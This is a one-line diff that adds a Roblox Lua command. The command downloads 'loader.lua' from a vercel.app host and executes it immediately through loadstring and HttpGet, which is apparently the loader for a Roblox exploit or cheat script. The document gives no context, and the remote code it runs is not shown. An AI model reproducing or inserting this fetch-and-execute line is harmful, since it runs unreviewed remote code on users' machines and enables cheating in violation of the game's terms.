@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://spectraroblox.vercel.app/loader.lua"))()
